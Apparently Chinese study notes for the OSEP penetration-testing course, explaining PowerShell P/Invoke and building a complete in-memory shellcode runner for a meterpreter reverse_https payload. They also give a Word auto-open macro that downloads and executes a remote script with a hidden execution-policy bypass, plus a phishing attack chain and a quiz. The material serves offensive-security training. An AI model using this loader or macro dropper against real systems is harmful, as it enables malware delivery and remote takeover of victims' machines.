---
title: OSEP-05-PowerShell与Win32API
description: '05-反射式PowerShell | 01-PowerShell与Win32API'
pubDate: 2026-01-30T00:00:40+08:00
image: /image/fengmian/OSEP.png
categories:
  - Documentation
  - OffSec
tags:
  - PEN-300-OSEP
  - Windows Learning
  - Exploit Development
  - PowerShell
---

# Module 05: 反射式 PowerShell

## 第一节：PowerShell 与 Win32 API

### 为什么 PowerShell 如此重要？

对于 Web 安全从业者来说，PowerShell 可能只是一个命令行工具。但在 OSEP 中，PowerShell 是一个**强大的攻击平台**：

- 内置于所有现代 Windows 系统
- 可以访问完整的 .NET Framework
- 可以调用 Win32 API
- 支持内存中执行代码
- 可以绑定某些安全检测

```
PowerShell 的能力层次：

┌─────────────────────────────────────┐
│         PowerShell 脚本            │
├─────────────────────────────────────┤
│         .NET Framework             │
├─────────────────────────────────────┤
│           Win32 API                │
├─────────────────────────────────────┤
│         Windows 内核               │
└─────────────────────────────────────┘
```

---

## 一、PowerShell 基础回顾

### 1.1 变量和数据类型

```powershell
# 变量声明（使用 $ 前缀）
$name = "OSEP"
$number = 42
$array = @(1, 2, 3, 4, 5)
$hash = @{
    "key1" = "value1"
    "key2" = "value2"
}

# 类型转换
[int]$num = "123"
[byte[]]$bytes = 0x41, 0x42, 0x43
[IntPtr]$pointer = 0
```

### 1.2 比较运算符

```powershell
# PowerShell 使用特殊的比较运算符
$a -eq $b    # 等于 (==)
$a -ne $b    # 不等于 (!=)
$a -gt $b    # 大于 (>)
$a -lt $b    # 小于 (<)
$a -ge $b    # 大于等于 (>=)
$a -le $b    # 小于等于 (<=)

# 示例
if ($status -eq 200) {
    Write-Host "Success"
}
```

### 1.3 Here-String（多行字符串）

```powershell
# Here-String 用于定义多行文本
$code = @"
这是第一行
这是第二行
可以包含 "引号" 和 '单引号'
"@

# 常用于嵌入 C# 代码
$csharp = @"
using System;
public class MyClass {
    public static void Main() {
        Console.WriteLine("Hello");
    }
}
"@
```

---

## 二、从 PowerShell 调用 Win32 API

### 2.1 为什么需要调用 Win32 API？

PowerShell 本身无法直接：
- 分配可执行内存
- 创建线程
- 执行 shellcode

但通过 .NET Framework 和 P/Invoke，我们可以调用任意 Win32 API。

### 2.2 P/Invoke 简介

P/Invoke (Platform Invocation Services) 是 .NET 提供的机制，允许托管代码调用非托管 DLL 中的函数。

```
PowerShell → Add-Type → C# 代码 → P/Invoke → Win32 API
```

### 2.3 使用 Add-Type 调用 Win32 API

```powershell
# 步骤 1: 定义 C# 代码（包含 DllImport）
$User32 = @"
using System;
using System.Runtime.InteropServices;

public class User32 {
    [DllImport("user32.dll", CharSet=CharSet.Auto)]
    public static extern int MessageBox(IntPtr hWnd, String text, String caption, int options);
}
"@

# 步骤 2: 使用 Add-Type 编译 C# 代码
Add-Type $User32

# 步骤 3: 调用 API
[User32]::MessageBox(0, "Hello from PowerShell!", "Test", 0)
```

### 2.4 DllImport 属性详解

```csharp
[DllImport("kernel32.dll",      // DLL 名称
    SetLastError = true,         // 保存错误码
    CharSet = CharSet.Auto,      // 字符集
    ExactSpelling = true)]       // 精确匹配函数名
public static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,            // 参数
    uint dwSize,
    uint flAllocationType,
    uint flProtect
);
```

---

## 三、Shellcode Runner 核心 API

### 3.1 VirtualAlloc - 分配内存

```powershell
# C# 声明
[DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
public static extern IntPtr VirtualAlloc(
    IntPtr lpAddress,      # 分配地址（0 = 系统选择）
    uint dwSize,           # 大小
    uint flAllocationType, # 分配类型
    uint flProtect         # 内存保护
);

# 调用示例
$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)

# 参数说明
# 0x3000 = MEM_COMMIT | MEM_RESERVE
# 0x40   = PAGE_EXECUTE_READWRITE
```

### 3.2 CreateThread - 创建线程

```powershell
# C# 声明
[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(
    IntPtr lpThreadAttributes,  # 安全属性（0 = 默认）
    uint dwStackSize,           # 栈大小（0 = 默认）
    IntPtr lpStartAddress,      # 起始地址（shellcode 地址）
    IntPtr lpParameter,         # 参数（0 = 无）
    uint dwCreationFlags,       # 创建标志（0 = 立即运行）
    IntPtr lpThreadId           # 线程 ID（0 = 不需要）
);

# 调用示例
$thread = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)
```

### 3.3 WaitForSingleObject - 等待线程

```powershell
# C# 声明
[DllImport("kernel32.dll")]
public static extern UInt32 WaitForSingleObject(
    IntPtr hHandle,        # 线程句柄
    UInt32 dwMilliseconds  # 等待时间（0xFFFFFFFF = 无限）
);

# 调用示例
[Kernel32]::WaitForSingleObject($thread, [uint32]"0xFFFFFFFF")
```

---

## 四、完整的 PowerShell Shellcode Runner

### 4.1 生成 Shellcode

```bash
# 在 Kali 上生成 PowerShell 格式的 shellcode
msfvenom -p windows/x64/meterpreter/reverse_https \
    LHOST=192.168.1.100 \
    LPORT=443 \
    EXITFUNC=thread \
    -f ps1

# 输出示例
[Byte[]] $buf = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8)  # 实际输出会包含完整字节
```

### 4.2 完整代码

```powershell
# PowerShell Shellcode Runner

# 定义 Win32 API
$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
    public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
    public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);
}
"@

Add-Type $Kernel32

# Shellcode (msfvenom 生成)
[Byte[]] $buf = @(0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00)  # 实际使用时替换为完整 shellcode

# 获取 shellcode 大小
$size = $buf.Length

# 分配可执行内存
[IntPtr]$addr = [Kernel32]::VirtualAlloc(0, $size, 0x3000, 0x40)

# 复制 shellcode 到分配的内存
[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size)

# 创建线程执行 shellcode
$thread = [Kernel32]::CreateThread(0, 0, $addr, 0, 0, 0)

# 等待线程执行完成
[Kernel32]::WaitForSingleObject($thread, [uint32]"0xFFFFFFFF")
```

### 4.3 代码流程图

```
┌─────────────────────────────────────┐
│  1. Add-Type 编译 C# 代码          │
│     导入 Win32 API                  │
└─────────────────┬───────────────────┘
                  │
                  ▼
┌─────────────────────────────────────┐
│  2. VirtualAlloc                    │
│     分配可执行内存                  │
│     返回内存地址 $addr              │
└─────────────────┬───────────────────┘
                  │
                  ▼
┌─────────────────────────────────────┐
│  3. Marshal.Copy                    │
│     复制 shellcode 到 $addr         │
└─────────────────┬───────────────────┘
                  │
                  ▼
┌─────────────────────────────────────┐
│  4. CreateThread                    │
│     创建线程，起始地址 = $addr      │
│     返回线程句柄 $thread            │
└─────────────────┬───────────────────┘
                  │
                  ▼
┌─────────────────────────────────────┐
│  5. WaitForSingleObject             │
│     等待线程执行完成                │
└─────────────────────────────────────┘
```

---

## 五、与 VBA 宏结合

### 5.1 下载并执行 PowerShell 脚本

```vba
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim str As String
    ' 下载 PowerShell 脚本并执行
    str = "powershell -ep bypass -w hidden -c ""IEX(New-Object Net.WebClient).DownloadString('http://192.168.1.100/run.ps1')"""
    CreateObject("WScript.Shell").Run str, 0
End Sub
```

### 5.2 参数说明

| 参数 | 说明 |
|------|------|
| `-ep bypass` | 绕过执行策略 |
| `-w hidden` | 隐藏窗口 |
| `-c` | 执行命令 |
| `IEX` | Invoke-Expression 的别名 |

### 5.3 完整攻击流程

```
1. 生成 shellcode (Kali)
   msfvenom -p windows/x64/meterpreter/reverse_https ...

2. 创建 PowerShell 脚本 (run.ps1)
   包含 shellcode runner 代码

3. 部署到 Web 服务器
   cp run.ps1 /var/www/html/

4. 创建 Word 文档
   包含下载执行的 VBA 宏

5. 启动监听器
   msfconsole → multi/handler

6. 发送钓鱼邮件
   附件: malicious.doc

7. 受害者打开文档并启用宏
   → 下载 run.ps1
   → 执行 shellcode
   → 获得 shell
```

---

## 六、章节测试

### 选择题

1. PowerShell 中用于编译 C# 代码的命令是？
   - A) Compile-Type
   - B) Add-Type
   - C) New-Type
   - D) Import-Type

2. P/Invoke 的作用是什么？
   - A) 调用 PowerShell 函数
   - B) 调用 .NET 方法
   - C) 调用非托管 DLL 中的函数
   - D) 调用 Web API

3. VirtualAlloc 的 0x40 参数表示什么？
   - A) PAGE_READONLY
   - B) PAGE_READWRITE
   - C) PAGE_EXECUTE_READWRITE
   - D) PAGE_NOACCESS

4. WaitForSingleObject 的 0xFFFFFFFF 参数表示什么？
   - A) 等待 1 秒
   - B) 不等待
   - C) 无限等待
   - D) 等待 10 秒

5. PowerShell 中 `-ep bypass` 的作用是？
   - A) 启用执行策略
   - B) 绕过执行策略
   - C) 设置执行策略
   - D) 删除执行策略

### 答案

1-B, 2-C, 3-C, 4-C, 5-B

---

**下一节**：[02-下载摇篮技术.md](/blog/osep/05-反射式powershell/02-下载摇篮技术/) - PowerShell 下载摇篮
